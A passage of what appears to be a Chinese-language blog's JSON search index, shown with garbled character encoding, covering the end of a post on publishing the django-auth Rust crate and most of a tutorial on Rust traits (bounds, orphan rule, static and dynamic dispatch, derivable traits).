ç²˜è´´å¹¶å›è½¦å³å¯ã€‚\néªŒè¯é‚®ç®±\nå‘å¸ƒ crate å‰éœ€è¦å…ˆéªŒè¯é‚®ç®±ï¼Œå¦åˆ™ä¼šå‘å¸ƒå¤±è´¥ã€‚æ‰“å¼€ profile é¡µï¼ŒæŒ‰ç…§æŒ‡ç¤ºå¡«å…¥é‚®ç®±å¹¶éªŒè¯å³å¯ã€‚\nå¡«å†™ package ä¿¡æ¯\nå‘å¸ƒå‰éœ€è¦åœ¨ Cargo.toml æ–‡ä»¶ä¸­çš„ package æ®µä¸­å¡«å†™å¦‚ä¸‹ä¿¡æ¯ï¼š\nlicense or license-file: ç‰ˆæƒä¿¡æ¯ã€‚ description: åº“çš„ä¸€å¥è¯ä»‹ç»ã€‚ homepage: ä¸»é¡µã€‚ documentation: æ–‡æ¡£é“¾æ¥ï¼ˆå¯é€‰ï¼Œä¸å¡«åˆ™ä¼šè‡ªåŠ¨ä½¿ç”¨è¯¥ crate å¯¹åº”çš„ docs.rs æ–‡æ¡£é“¾æ¥ï¼‰ã€‚ repository: ä»£ç ä»“åº“ã€‚ readme: readme æ–‡ä»¶åï¼ˆå¯é€‰ï¼Œå¦‚æœæœ‰ README.md æ–‡ä»¶ï¼Œä¼šè‡ªåŠ¨ä½¿ç”¨ï¼‰ã€‚ æ›´è¯¦ç»†çš„ä¿¡æ¯å¯ä»¥å‚è€ƒ å®˜æ–¹çš„ Crate å‘å¸ƒæŒ‡å—ï¼Œä¹Ÿå¯ä»¥å‚è€ƒ django-auth çš„ Cargo.toml ã€‚\nå‘å¸ƒ Crate\npackage ä¿¡æ¯ç¡®è®¤åï¼Œå¯ä»¥åœ¨ä½ çš„ crate é¡¹ç›®æ ¹ç›®å½•ï¼Œå…ˆè¿è¡Œå¦‚ä¸‹å‘½ä»¤æ£€æŸ¥ä¸€ä¸‹å‘å¸ƒæµç¨‹ï¼š\n1 cargo publish --dry-run è¯¥å‘½ä»¤ä¸ä¼šçœŸæ­£æ‰§è¡Œå‘å¸ƒæ“ä½œï¼Œä½†æ˜¯ä¼šæŠŠæäº¤åˆ° crate.io ä¹‹å‰è¦åšçš„äº‹æƒ…éƒ½åšä¸€éã€‚\nç¡®è®¤æ— è¯¯åï¼Œå¯ä»¥è¿è¡Œå¦‚ä¸‹å‘½ä»¤ï¼ŒçœŸæ­£å°† crate å‘å¸ƒè‡³ crate.io:\n1 cargo publish âœ… æå®šï¼\n","description":"","tags":["rust","django"],"title":"å‘å¸ƒæˆ‘çš„ç¬¬ä¸€ä¸ª Crate: django-auth","uri":"/posts/publish-crate-django-auth/"},{"categories":null,"content":"Trait åˆæ¢ trait æ˜¯ Rust ä¸­ç”¨æ¥å®šä¹‰å…±äº«è¡Œä¸ºçš„æŠ½è±¡æœºåˆ¶ï¼Œå’Œ Java çš„ interface, Swift çš„ protocol ç­‰æ¥å£æŠ½è±¡æœºåˆ¶æœ‰ç‚¹ç±»ä¼¼ã€‚\nå®šä¹‰ä¸€ä¸ª trait å¾ˆç®€å•ï¼š\n1 2 3 trait Callable { fn call(\u0026self); } ä¸º Rust çš„ str ç±»å‹å®ç°è¯¥ trait (implâ€‹ements Callable for str):\n1 2 3 4 5 6 7 impl Callable for str { fn call(\u0026self) { println!(\"call on {self}\"); } } \"job-1\".call(); 1 call on job-1 ä¸Šé¢çš„ä»£ç ä¸ºåŸºæœ¬ç±»å‹ str æ‰©å±•äº†ä¸€ä¸ª call æ–¹æ³•ï¼Œè¯­æ³•ä¸Šè¿˜æ˜¯æŒºç®€æ´ã€ç›´è§‚çš„ã€‚\nè¿™ç§ä¸ºç°æœ‰ç±»å‹æ‰©å±• trait å®ç°çš„èƒ½åŠ›ï¼Œé™¤äº†å¯ä»¥åº”ç”¨åœ¨ Rust çš„åŸºæœ¬ç±»å‹ä¸Šï¼Œä¹Ÿå¯ä»¥åº”ç”¨åœ¨æ ‡å‡†åº“ã€å¤–éƒ¨ç¬¬ä¸‰æ–¹åº“ä»¥åŠè‡ªå®šä¹‰çš„å„ç§ç±»å‹ä¸Šï¼Œå‰æåªè¦ä¸è¿å å­¤å„¿è§„åˆ™ (Orphan Rule) å³å¯ã€‚\nJava ä¸æ”¯æŒè¿™ç§èƒ½åŠ›ï¼ŒKotlin é€šè¿‡ extension function å¯ä»¥ä¸ºç°æœ‰ç±»å‹æ‰©å±•æ–°æ–¹æ³•ï¼ˆä»…é™äºå¢åŠ æ–¹æ³•ï¼Œä¸æ”¯æŒå¢åŠ æ–°çš„ interface å®ç°ï¼‰ï¼Œè€Œ Swift æ˜¯æ”¯æŒçš„ã€‚\nå½“ç„¶ï¼Œtrait çš„èƒ½åŠ›è¿œä¸æ­¢äºæ­¤ï¼Œè¿œæ¯” interface/protocol å¼ºå¤§å’Œå¤æ‚å¾—å¤šã€‚ä¸‹é¢æˆ‘ä»¬æ¥é€ä¸€æ¢æ trait çš„è¿™äº›å¼ºå¤§åŠŸèƒ½ã€‚\nTrait çš„åŸºæœ¬ç”¨æ³• Rust ä¸­çš„æ“ä½œç¬¦å®šä¹‰ å‰é¢ä»‹ç»äº†å¦‚ä½•ä¸ºå¤–éƒ¨ç±»å‹æ‰©å±•æ–¹æ³•ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥åè¿‡æ¥ï¼Œä¸ºè‡ªå®šä¹‰ç±»å‹å®ç°æ ‡å‡†åº“ä¸­å®šä¹‰çš„ trait, æˆ–è€…å®ç°å¤–éƒ¨åº“ä¸­å®šä¹‰çš„ traitã€‚\nä¸ºè‡ªå®šä¹‰ç±»å‹ Offset æ‰©å±•æ“ä½œç¬¦ + çš„å®ç°ï¼ˆé™„å¸¦ += â€‹â€‹å®ç°ï¼‰ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 use std::ops::AddAssign; #[derive(Debug, Copy, Clone, PartialEq)] struct Offset { x: i32, y: i32, } impl AddAssign\u003ci32\u003e for Offset { fn add_assign(\u0026mut self, v: i32) { *self = Self { x: self.x + v, y: self.y + v, }; } } let mut offset = Offset { x: 1, y: 0 }; offset += 2; assert_eq!(offset, Offset { x: 3, y: 2 }); ğŸŒŸ Tips\nä¸Šè¿°ä»£ç è¯´æ˜äº†ä¸€ä¸ªäº‹å®ï¼Œå³ Rust ä¸­çš„æ“ä½œç¬¦ä¹Ÿæ˜¯é€šè¿‡ trait æ¥å®šä¹‰çš„ã€‚å› æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥è½»æ¾é€šè¿‡å®ç° trait æ¥ä¸ºè‡ªå®šä¹‰ç±»å‹å¢åŠ æ“ä½œç¬¦çš„æ”¯æŒã€‚ç”¨æ³•ä¹Ÿæ˜¯æ ‡å‡†çš„ trait ç”¨æ³•ï¼Œå¹¶æ²¡æœ‰å¼•å…¥æ–°çš„ã€æ“ä½œç¬¦é‡è½½ã€çš„æ¦‚å¿µã€‚\nTrait ä¸­çš„é»˜è®¤å®ç° å’Œ Java ç±»ä¼¼ï¼ˆJava 8 å¼•å…¥è¯¥ç‰¹æ€§ï¼‰ï¼Œtrait åœ¨å®šä¹‰æ—¶å¯ä»¥æä¾›æ–¹æ³•çš„é»˜è®¤å®ç°ï¼š\n1 2 3 4 5 6 7 pub trait Summary { fn summarize_author(\u0026self) -\u003e String; fn summarize(\u0026self) -\u003e String { format!(\"(Read more from {}...)\", self.summarize_author()) } } é»˜è®¤å®ç°å¹¿æ³›å­˜åœ¨äº Rust æ ‡å‡†åº“æä¾›çš„ trait ä¸­ï¼Œä¸ºå¼€å‘è¿‡ç¨‹æä¾›äº†å¾ˆå¤§çš„ä¾¿åˆ©ï¼Œå¹¶è§„èŒƒäº†ä¸€äº›ç¼–ç¨‹çš„æƒ¯ç”¨æ³• (idioms)ã€‚\nç‰¹å¾çº¦æŸ (Trait Bound) Trait å¯ä»¥å’Œæ³›å‹ç¼–ç¨‹å¾ˆå¥½çš„ç»“åˆä½¿ç”¨ï¼Œå¯ç”¨äºä¸ºæ³›å‹ç±»å‹æä¾›ç‰¹å¾çº¦æŸï¼š\n1 2 3 pub fn notify(item: \u0026impl Summary) { println!(\"Breaking news! {}\", item.summarize()); } impl Trait å®é™…ä¸Šæ˜¯ trait bound çš„è¯­æ³•ç³–ï¼Œä¸Šè¿°ä»£ç å’Œä¸‹é¢çš„ä»£ç ç­‰ä»·ï¼š\n1 2 3 fn notify\u003cT: Summary\u003e(item: \u0026T) { println!(\"Breaking news! {}\", item.summarize()); } å¤šé‡ç‰¹å¾çº¦æŸ é€šè¿‡ + æ“ä½œç¬¦æ”¯æŒå¤šé‡ç‰¹å¾çº¦æŸï¼š\n1 2 pub fn notify(item: \u0026(impl Summary + Display)) { } ç­‰ä»·äºï¼š\n1 2 pub fn notify\u003cT: Summary + Display\u003e(item: \u0026T) { } åœ¨ where å­å¥ä¸­å®šä¹‰ Trait Bound åœ¨æ³›å‹å‚æ•°å’Œçº¦æŸè¾ƒå¤šæ—¶ï¼Œè¿™ç§æ–¹å¼ç›¸å¯¹ä¼šæ›´åŠ æ¸…æ™°ä¸€äº›ï¼š\n1 2 3 4 5 fn some_function\u003cT, U\u003e(t: \u0026T, u: \u0026U) -\u003e i32 where T: Display + Clone, U: Clone + Debug, {} ä½¿ç”¨ç‰¹å¾çº¦æŸæœ‰æ¡ä»¶åœ°å®ç°æ–¹æ³• (Conditional APIs) è¿™ä¸ªåŠŸèƒ½å¾ˆæœ‰æ„æ€ï¼Œå¯ä»¥ä¸ºæ³›å‹çš„ç‰¹å®šç±»å‹ï¼ˆå®ç°äº†æŸäº› trait çš„ç±»å‹ï¼‰å¢åŠ é¢å¤–çš„æ–¹æ³•å®šä¹‰ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 use std::fmt::Display; struct Pair\u003cT\u003e { x: T, y: T, } impl\u003cT\u003e Pair\u003cT\u003e { fn new(x: T, y: T) -\u003e Self { Self { x, y } } } impl\u003cT: Display + PartialOrd\u003e Pair\u003cT\u003e { // è¯¥æ–¹æ³•ä»…åœ¨ T å®ç°äº† Display + PartialOrd æ—¶å¯ç”¨ã€‚ fn cmp_display(\u0026self) { if self.x \u003e= self.y { println!(\"The largest member is x = {}\", self.x); } else { println!(\"The largest member is y = {}\", self.y); } } } ä¸€æ½å­å®ç° (Blanket Implementations) è¿™ä¸ªåŠŸèƒ½å¾ˆå¼ºå¤§ï¼Œåœ¨æ ‡å‡†åº“ä¸­å¹¿æ³›ä½¿ç”¨ï¼Œä¾‹å¦‚ï¼š\n1 2 3 4 // ä¸ºå®ç°äº† Display trait çš„ä»»æ„ç±»å‹å®ç° ToString trait impl\u003cT: Display\u003e ToString for T { // --snip-- } ä¹Ÿå°±æ˜¯è¯´ï¼Œä¸€ä¸ªç±»å‹åªè¦å®ç°äº† Display trait, ä¾¿è‡ªåŠ¨å®ç°äº† ToString traitï¼ˆå…è´¹è·å¾—è¯¥æ¥å£ï¼‰, å¯ä»¥å¯¹å…¶è°ƒç”¨ to_string æ–¹æ³•ï¼ˆè¯¥æ–¹æ³•ç”± ToString trait å®šä¹‰ï¼‰ã€‚å› æ­¤ï¼Œå¦‚æœä¸€ä¸ªç±»å‹éœ€è¦æ”¯æŒè½¬æ¢æˆ String, æˆ‘ä»¬ä¸€èˆ¬å®ç° Display trait å³å¯ã€‚\nBlanket implementations ä¹Ÿéœ€è¦éµå®ˆå­¤å„¿è§„åˆ™ (Orphan Rule)ï¼Œè€Œä¸”æƒ…å†µä¼šæ›´åŠ å¤æ‚ä¸€äº›ã€‚è¯·å‚è€ƒä¸‹é¢è¿™ä¸ªé”™è¯¯ç¤ºèŒƒï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 struct Position { pub x: usize, pub y: usize, } enum Offset { Forward(usize), Backward(usize), } pub trait Document { // è·å–ä¸€äº›æ–‡æ¡£çš„ä¸Šä¸‹æ–‡ä¿¡æ¯ // ... } // å°è¯•ä¸ºå®ç°äº† Document trait çš„ä»»æ„ç±»å‹å®ç° AddAssign trait // ç¼–è¯‘å¤±è´¥â— impl\u003cT: Document\u003e std::ops::AddAssign\u003cOffset\u003e for T { fn add_assign(\u0026mut self, rhs: Offset) { } } ä¸Šè¿°æ¡ˆä¾‹ä¸­ï¼Œ AddAssign æ˜¯æ ‡å‡†åº“ä¸­å®šä¹‰çš„ trait, å±äºå¤–éƒ¨ç±»å‹ï¼Œè€Œ T æ˜¯ä¸€ä¸ªæ³›å‹ç±»å‹ï¼Œæ„å‘³ç€ T å¯ä»¥æ˜¯ä»»æ„å®ç°äº† Document trait çš„ç±»å‹ï¼ˆåŒ…æ‹¬å®šä¹‰åœ¨å…¶ä»– crate ä¸­çš„å¤–éƒ¨ç±»å‹ï¼‰ï¼Œå› æ­¤ï¼Œè¿åäº†å­¤å„¿è§„åˆ™çš„å®šä¹‰ã€‚\nè¿”å›å®ç°äº†ç‰¹å®š Trait çš„ç±»å‹ åœ¨è¿”å›ç±»å‹ä¸­æŒ‡å®š trait ç±»å‹ï¼Œå¯ä»¥å¯¹è¿”å›ç±»å‹è¿›è¡Œçº¦æŸï¼š\n1 2 3 4 5 6 7 8 9 10 fn returns_summarizable() -\u003e impl Summary { Tweet { username: String::from(\"horse_ebooks\"), content: String::from( \"of course, as you probably already know, people\", ), reply: false, retweet: false, } } ç”±äºæ³›å‹ç±»å‹æ˜¯ç¼–è¯‘æ—¶ç¡®å®šçš„ï¼Œå› æ­¤ä¸Šè¿°è¿™ç§æ–¹å¼æœ‰ä¸ªé™åˆ¶ï¼Œå°±æ˜¯ä¸èƒ½åœ¨å‡½æ•°ä¸­çš„åˆ†æ”¯ä»£ç é‡Œï¼Œåˆ†åˆ«è¿”å›ä¸åŒçš„å…·ä½“ç±»å‹ã€‚\nå¦‚æœéœ€è¦æ”¯æŒè¿”å›å¤šä¸ªä¸åŒçš„å®ç°äº†æŸä¸ª trait çš„å…·ä½“ç±»å‹ï¼Œéœ€è¦ä½¿ç”¨ trait object (Box\u003cdyn Trait\u003e æˆ– \u0026dyn Trait, å‚è€ƒ Using Trait Objects That Allow for Values of Different Types)ã€‚\nå­¤å„¿è§„åˆ™ (Orphan Rule) ä¸ºç±»å‹å®ç° trait æœ‰ä¸€ä¸ªé™åˆ¶ï¼šè¯¥ç±»å‹å’Œè¦å®ç°çš„ trait è‡³å°‘è¦æœ‰ä¸€ä¸ªæ˜¯åœ¨å½“å‰ crate ä¸­å®šä¹‰çš„ï¼ˆcrate æ˜¯ Rust ä¸­çš„æœ€å°ç¼–è¯‘å•å…ƒï¼Œå‚è€ƒ Packages and Cratesï¼‰ã€‚\nè¯¥é™åˆ¶æ˜¯ä¸€è‡´æ€§ (coherence) å±æ€§çš„ä¸€éƒ¨åˆ†ï¼Œå«åšå­¤å„¿è§„åˆ™ (orphan rule)ã€‚è¯¥è§„åˆ™ç¡®ä¿å…¶ä»–äººçš„ä»£ç ä¸ä¼šç ´åä½ çš„ä»£ç ï¼Œåä¹‹äº¦ç„¶ã€‚\nä¾‹å¦‚ï¼Œä½ æ— æ³•ä¸ºæ ‡å‡†åº“ä¸­çš„ IpAddr ç±»å‹å¢åŠ  Iterator trait çš„å®ç°ï¼ˆå› ä¸ºè¿™äºŒè€…éƒ½å®šä¹‰åœ¨å¤–éƒ¨ crate ä¸­ï¼‰ï¼š\n1 2 3 4 5 6 7 8 9 10 use std::net::IpAddr; // ç¼–è¯‘å¤±è´¥â— impl Iterator for IpAddr { type Item = u8; fn next(\u0026mut self) -\u003e Option\u003cSelf::Item\u003e { return None } } ç¼–è¯‘å™¨æŠ¥å‘Šçš„é”™è¯¯å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 error[E0117]: only traits defined in the current crate can be implemented for types defined outside of the crate --\u003e src/main.rs:5:1 | 5 | impl Iterator for IpAddr { | ^^^^^^^^^^^^^^^^^^------ | | | | | `IpAddr` is not defined in the current crate | impl doesn't use only types from inside the current crate | = note: define and implement a trait or new type instead For more information about this error, try `rustc --explain E0117`. error: could not compile `cargo0Pk8IQ` (bin \"cargo0Pk8IQ\") due to previous error é”™è¯¯ä¿¡æ¯ååˆ†è¯¦å°½ï¼Œä¸ä»…è§£é‡Šäº†é”™è¯¯åŸå› ã€æŒ‡å‡ºäº†é”™è¯¯ä½ç½®ï¼Œè¿˜æä¾›äº†è§£å†³æ–¹æ¡ˆå’Œç›¸å…³æ–‡æ¡£è¯´æ˜ã€‚\né™æ€åˆ†æ´¾ \u0026 åŠ¨æ€åˆ†æ´¾ (Static dispatch \u0026 Dynamic dispatch) Trait æ”¯æŒä¸¤ç§åˆ†æ´¾æ–¹å¼ï¼Œä¸€ç§æ˜¯é™æ€çš„ï¼Œå³åœ¨ç¼–è¯‘æœŸç¡®å®šçš„åˆ†æ´¾æ–¹å¼ï¼›ç¬¬äºŒç§æ˜¯åŠ¨æ€çš„ï¼Œå³åœ¨è¿è¡Œæ—¶ç¡®å®šå¦‚ä½•åˆ†æ´¾ã€‚\né™æ€æ´¾å‘çš„ç‰¹ç‚¹ ä¸Šé¢æåˆ° trait åœ¨æ³›å‹ä¸­çš„ç”¨æ³•ï¼Œéƒ½æ˜¯ç¼–è¯‘æœŸç¡®å®šçš„ï¼Œå› æ­¤éƒ½å±äºé™æ€æ´¾å‘ã€‚è¿™ç§æ´¾å‘æ–¹å¼çš„ç‰¹ç‚¹å¦‚ä¸‹ï¼š\nç¼–è¯‘æœŸç¡®å®šï¼Œæ²¡æœ‰è¿è¡Œæ—¶å¼€é”€ï¼Œæ— æ€§èƒ½æŸå¤±ï¼Œå³æ‰€è°“çš„â€œé›¶æˆæœ¬æŠ½è±¡â€ (Zero-cost Abstraction)ã€‚\né’ˆå¯¹æ¯ä¸ªå…·ä½“ç±»å‹ï¼Œéƒ½ä¼šåœ¨ç¼–è¯‘æœŸäº§ç”Ÿä¸€ä¸ªâ€œå‰¯æœ¬â€ï¼Œè¿™ä¼šåœ¨ä¸€å®šç¨‹åº¦å¢åŠ äºŒè¿›åˆ¶æ–‡ä»¶å°ºå¯¸ï¼Œæœ‰ç‚¹â€œä»¥ç©ºé—´æ¢æ—¶é—´â€çš„æ„æ€ã€‚\nå½“ç„¶ï¼Œå³ä½¿ä¸ä½¿ç”¨ trait + æ³›å‹ç‰¹æ€§ï¼Œè‡ªå·±æ‰‹å†™ä»£ç ä¹Ÿå¹¶ä¸ä¼šæ¯”è¿™ä¸ªæ›´å°ï¼Œè¿™å°±æ˜¯ Stroustrup æ‰€è¯´çš„ â€œWhat you do use, you couldnâ€™t hand code any betterâ€ çš„æ„æ€ã€‚\næ”¯æŒå‡½æ•°è°ƒç”¨çš„å†…è”ä¼˜åŒ– (inline)ã€‚\nåŠ¨æ€æ´¾å‘çš„åŠ¨æœºã€ç”¨æ³• å½“æ¶‰åŠ trait object (\u0026dyn Trait æˆ– Box\u003cdyn Trait\u003e, å…¶ä¸­ Trait è¡¨ç¤ºæŸä¸ª traitï¼‰æ—¶ï¼Œå°±ä¼šå‡ºç°åŠ¨æ€åˆ†æ´¾ã€‚\nåŠ¨æ€æ´¾å‘çš„åŠ¨æœºä¸»è¦æ˜¯å¸Œæœ›å®ç°é¢å‘å¯¹è±¡è¯­è¨€ä¸­çš„å¤šæ€åŠŸèƒ½ï¼Œç±»ä¼¼ C++ çš„è™šå‡½æ•°ã€‚\nä¾‹å¦‚ï¼Œå‡è®¾æˆ‘ä»¬è¦å®ç°ä¸€ä¸ªä»»åŠ¡é˜Ÿåˆ—ï¼Œé˜Ÿåˆ—ä¸­çš„ä»»åŠ¡å¸Œæœ›è¶³å¤ŸæŠ½è±¡å’Œé€šç”¨ï¼Œå› æ­¤å¸Œæœ›é€šè¿‡ä¸€ä¸ª trait æ¥è¿›è¡Œçº¦æŸï¼Œç±»ä¼¼è¿™æ ·ï¼š\n1 2 3 4 5 6 7 trait Task { fn do_job(\u0026self); } struct TaskQueue { tasks: Vec\u003cBox\u003cdyn Task\u003e\u003e, } ä¸Šè¿°æ¡ˆä¾‹ä¸­ï¼Œæˆ‘ä»¬æ— æ³•åœ¨ç¼–è¯‘æœŸç¡®å®š Vec ä¸­å­˜å‚¨çš„å…·ä½“ç±»å‹ï¼Œå› æ­¤ï¼Œé™æ€åˆ†æ´¾æ˜¾ç„¶å·²ç»æ— æ³•æ»¡è¶³æˆ‘ä»¬çš„éœ€æ±‚ï¼Œåªèƒ½ä½¿ç”¨ Box\u003cdyn Task\u003e è¿™ç±»å¯¹è±¡ï¼Œä»è€Œå¼•å…¥åŠ¨æ€åˆ†æ´¾ã€‚\næœ‰äº†è¿™ä¸ªå®šä¹‰ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨ä¸€ç§ç»Ÿä¸€çš„æ–¹å¼ï¼Œå¯¹ tasks ä¸­çš„ä»»åŠ¡è¿›è¡Œæ“ä½œï¼Œè€Œæ— éœ€å…³å¿ƒ task çš„å…·ä½“ç±»å‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 impl TaskQueue { fn new() -\u003e TaskQueue { TaskQueue { tasks: Vec::new(), } } fn add(\u0026mut self, t: Box\u003cdyn Task\u003e) { self.tasks.push(t) } fn process(\u0026self) { self.tasks.iter().for_each(|t| t.do_job()); } } impl Task for \u0026str { fn do_job(\u0026self) { println!(\"do job: {self}\"); } } impl Task for i32 { fn do_job(\u0026self) { println!(\"do job: {self}\"); } } let mut q = TaskQueue::new(); q.add(Box::new(\"task 1\")); q.add(Box::new(2)); q.process(); 1 2 do job: task 1 do job: 2 åŠ¨æ€æ´¾å‘çš„å®ç°åŸç†å’Œç‰¹ç‚¹ trait çš„åŠ¨æ€æ´¾å‘çš„å®ç°ä¹Ÿå’Œ C++ çš„è™šå‡½æ•°ç±»ä¼¼ï¼Œå€Ÿç”¨äº†è™šå‡½æ•°è¡¨ (vtable) æ¥è¿›è¡ŒåŠ¨æ€æ´¾å‘ï¼š\ntrait object å­˜å‚¨äº†æŒ‡å‘å®ç°äº†è¯¥ trait çš„ç±»å‹å®ä¾‹çš„æŒ‡é’ˆ trait object å­˜å‚¨äº†åœ¨è¯¥ç±»å‹ä¸ŠæŸ¥æ‰¾ trait æ–¹æ³•çš„è¡¨ï¼ˆè™šå‡½æ•°è¡¨ï¼‰ æœ‰äº†ä»¥ä¸Šä¸¤ä¸ªä¿¡æ¯ï¼Œtrait object å°±å¯ä»¥åœ¨è¿è¡Œæ—¶ç¡®å®šå…·ä½“åº”è¯¥è°ƒç”¨å“ªä¸ªå‡½æ•°äº†ã€‚\näº†è§£äº†åŠ¨æ€æ´¾å‘çš„å®ç°åŸç†ï¼Œå…¶ç‰¹ç‚¹ä¹Ÿå¾ˆæ˜æ˜¾äº†ï¼š\næœ‰é¢å¤–çš„è¿è¡Œæ—¶å¼€é”€ï¼ˆæŸ¥è¡¨å¼€é”€ï¼‰ ä¸ä¼šé€ æˆç¼–è¯‘è†¨èƒ€ ä¸æ”¯æŒå‡½æ•°è°ƒç”¨çš„å†…è”ä¼˜åŒ– (inline) Trait çš„å¯¹ä¸¤ç§æ´¾å‘æ–¹å¼çš„æ”¯æŒï¼Œä¹Ÿä½“ç°äº† pay as you go çš„è®¾è®¡åŸåˆ™ï¼šå½“ä½ éœ€è¦æ›´é«˜çº§çš„æŠ½è±¡èƒ½åŠ›æ—¶ï¼Œä½ å¯ä»¥ä½¿ç”¨åŠ¨æ€æ´¾å‘ï¼›å½“ä½ ä¸éœ€è¦æ—¶ï¼Œtrait çš„æŠ½è±¡ä¼šåœ¨ç¼–è¯‘æœŸè¢«è¿˜åŸæˆå…·ä½“ç±»å‹ï¼Œæ— éœ€ä»˜å‡ºä»»ä½•é¢å¤–çš„ä»£ä»·ã€‚\nå¯æ´¾ç”Ÿçš„ Trait (Derivable Traits) Derivable trait æŒ‡å¯ä»¥é€šè¿‡ç¼–è¯‘å™¨è‡ªåŠ¨å®ç°çš„ traitã€‚å¯¹äºæŸäº›æ ‡å‡†åº“ä¸­å®šä¹‰çš„ traitï¼Œ Rust å…è®¸ä½ åœ¨è‡ªå®šä¹‰ç±»å‹ä¸Šé€šè¿‡ç®€å•åœ°æ·»åŠ ä¸€ä¸ªå±æ€§ï¼ˆattributeï¼‰æ¥è‡ªåŠ¨å®ç°è¿™äº› traitï¼Œè€Œä¸éœ€è¦æ‰‹åŠ¨ç¼–å†™å®ç°ä»£ç ã€‚è¿™ä¸ªè¿‡ç¨‹è¢«ç§°ä¸º â€œæ´¾ç”Ÿâ€ï¼ˆderivingï¼‰ã€‚\nä½¿ç”¨å¯æ´¾ç”Ÿ trait çš„ä¸»è¦ä¼˜ç‚¹æ˜¯å®ƒå‡å°‘äº†æ ·æ¿ä»£ç çš„æ•°é‡ï¼Œä½¿å¾—ç±»å‹å®šä¹‰æ›´åŠ ç®€æ´ã€‚è¿™å¯¹äºæé«˜ä»£ç çš„å¯è¯»æ€§å’Œå¯ç»´æŠ¤æ€§éå¸¸æœ‰å¸®åŠ©ã€‚\né™¤äº†æ ‡å‡†åº“æä¾›çš„ derivable traits å¤–ï¼Œç¬¬ä¸‰æ–¹åº“ä¹Ÿå¯ä»¥ä¸ºè‡ªå·±çš„ traits å®ç° derive, å› æ­¤ï¼Œè¿™ä¸ª derivable traits åˆ—è¡¨æ˜¯å¼€æ”¾çš„ã€‚\nä¸‹é¢åˆ—å‡ºäº†ç›®å‰ä¸ºæ­¢æ ‡å‡†åº“æä¾›çš„æ‰€æœ‰ derivable traits, å¹¶å¯¹å…¶ä½¿ç”¨è¦ç‚¹è¿›è¡Œç®€å•è¯´æ˜ã€‚\nDebug ç”¨äºæ”¯æŒå­—ç¬¦ä¸²æ ¼å¼åŒ–ä¸­çš„ {:?} å ä½ç¬¦ï¼Œä¸»è¦ç”¨äº debug æ‰“å°ã€‚\nç‰¹æ®Šåº”ç”¨åœºæ™¯ï¼š\nassert_eq! å®è¦æ±‚å…¶å‚æ•°å®ç° Debug traitã€‚ ç”¨æ³•æ¼”ç¤ºï¼š\n1 2 3 4 5 6 7 8 #[derive(Debug)] // è‡ªåŠ¨æ´¾ç”Ÿ Debug trait çš„å®ç° struct Position { x: u32, y: u32, } let p = Position{ x: 10, y: 20 }; println!(\"{:?}\", p); 1 Position { x: 10, y: 20 } ä¸Šé¢æ˜¯ç¨‹åºçš„è¾“å‡ºç»“æœã€‚\nPartialEq, Eq ç”¨äºæ”¯æŒ == å’Œ != æ“ä½œç¬¦ã€‚ Eq æ²¡æœ‰æ–¹æ³•å®šä¹‰ï¼Œåªæ˜¯ä¸€ä¸ªæŒ‡ç¤ºï¼Œè¡¨æ˜é’ˆå¯¹è¯¥ç±»å‹çš„æ¯ä¸ªå€¼ï¼Œè¯¥å€¼éƒ½ç­‰äºå…¶è‡ªèº«ã€‚ Eq trait åªèƒ½åº”ç”¨äºå®ç°äº† PartialEq çš„ç±»å‹ã€‚ ç‰¹æ®Šåº”ç”¨åœºæ™¯ï¼š\nassert_eq! å®è¦æ±‚å…¶å‚æ•°å®ç° PartialEq traitã€‚ HashMap\u003cK, V\u003e è¦æ±‚ key å€¼å®ç° Eq traitã€‚ ç”¨æ³•æ¼”ç¤ºï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 #[derive(PartialEq, Eq, Debug)] struct Rect { left: u32, right: u32, top: u32, bottom: u32, } let r1 = Rect { left: 0, right: 10, top: 0, bottom: 10, }; let r2 = Rect { left: 0, right: 10, top: 0, bottom: 10, }; dbg!(r1 == r2); 1 [src/main.rs:25] r1 == r2 = true PartialOrd, Ord PartialOrd å’Œ Ord ç”¨äºæ”¯æŒç±»å‹çš„æ¯”è¾ƒæ“ä½œï¼Œå¯ç”¨äº \u003c, \u003e, \u003c=, \u003e= è¿™å‡ ä¸ªæ“ä½œç¬¦ã€‚äºŒè€…ä¹‹é—´æœ‰å¦‚ä¸‹åŒºåˆ«ï¼š\nPartialOrd åªèƒ½åº”ç”¨åœ¨å®ç°äº† PartialEq çš„ç±»å‹ä¸Š Ord åªèƒ½åº”ç”¨åœ¨å®ç°äº† Eq (ä»è€Œä¹Ÿéœ€è¦å®ç° PartialEq ) çš„ç±»å‹ä¸Š PartialOrd è¿”å›çš„æ˜¯ Option\u003cOrdering\u003e ç±»å‹ï¼Œè€Œ Ord è¿”å›çš„æ˜¯ Ordering ç±»å‹ PartialOrd æ”¯æŒçš„å¯æ¯”è¾ƒæ€§æ˜¯å¯é€‰çš„ æ¯”è¾ƒæœ‰æ„æ€çš„æ˜¯ï¼Œ PartialOrd ä¸­å®šä¹‰çš„æ¯”è¾ƒæ–¹æ³•è¿”å›çš„æ˜¯ä¸€ä¸ª Option\u003cOrdering\u003e ç±»å‹ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå¯ä»¥è¡¨è¾¾æŸäº›å€¼ä¹‹é—´ä¸å¯æ¯”è¾ƒçš„è¯­æ„ã€‚\nä¸ºäº†æ¼”ç¤ºè¿™ä¸ªæ¦‚å¿µï¼Œä¸‹é¢æœæ’°äº†ä¸€ä¸ªä¾‹å­ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 #[derive(PartialEq)] // è‡ªåŠ¨æ´¾ç”Ÿ PartialEq trait çš„å®ç° enum E { Man(u16), Dog(u16), } use E::{Dog, Man}; impl PartialOrd for E { fn partial_cmp(\u0026self, other: \u0026Self) -\u003e Option\u003cstd::cmp::Ordering\u003e { return if let (Dog(me), Dog(other)) = (self, other) { // Dog åªå’Œ Dog ç›¸æ¯”è¾ƒ 